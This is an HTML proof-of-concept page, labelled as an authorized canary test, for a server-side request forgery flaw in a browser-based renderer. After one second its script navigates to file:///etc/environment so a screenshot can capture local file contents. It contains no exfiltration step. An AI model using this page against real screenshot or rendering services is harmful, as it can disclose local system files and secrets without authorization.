<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>SSRF canary PoC</title>
<style>
  :root { color-scheme: light; }
  body { margin:0; background:#fff; color:#111;
         font-family: ui-monospace, "Courier New", monospace; }
  .banner { background:#b00020; color:#fff; padding:12px 20px; font-weight:700; }
  .meta { padding:8px 20px; color:#555; font-size:14px; }
  h1 { padding:16px 20px 0; font-size:22px; }
  #result { white-space:pre-wrap; word-break:break-all;
            font-size:40px; line-height:1.3; padding:16px 20px; }
  .ok  { color:#0a7d00; }
  .err { color:#b00020; }
</style>
</head>
<body>
  <div class="banner">AUTHORIZED PoC — PBI DEV_MIERUCA_HEAT_OPT-8981 — canary only</div>
  <div class="meta">
    Target: <span id="target"></span> · loaded: <span id="ts"></span>
  </div>
  <h1>file:// read attempt from an https origin</h1>
  <div id="result">… đang thử đọc …</div>

<script>
  // PoC CÓ PHÉP. Chỉ đọc file canary vô hại và render ra màn hình để ảnh chụp
  // bắt được. KHÔNG gửi nội dung đi đâu. Kết quả cho biết same-origin policy của
  // Chromium có chặn một trang https đọc file:// hay không.
  //
  // Đây là một bằng chứng, không phải công cụ triển khai: không đổi đường dẫn này
  // sang file nhạy cảm, và không thêm bước gửi nội dung tới server bên ngoài.
  var TARGET = "file:///etc/environment";  // file có thể đọc được
  var el = document.getElementById("result");
  document.getElementById("target").textContent = TARGET;
  document.getElementById("ts").textContent = new Date().toISOString();

  function show(cls, text) { el.className = cls; el.textContent = text; }

  // Sau 1 giây, điều hướng CHÍNH tab hiện tại sang TARGET (không mở tab mới).
  // Nếu trình duyệt cho phép https -> file:// navigation thì tab sẽ hiển thị
  // nội dung file; nếu bị chặn thì tab đứng yên / báo lỗi điều hướng.
  show("ok", "… sẽ điều hướng sau 1 giây …");
  setTimeout(function () {
    window.location.href = TARGET;
  }, 1000);
</script>
</body>
</html>
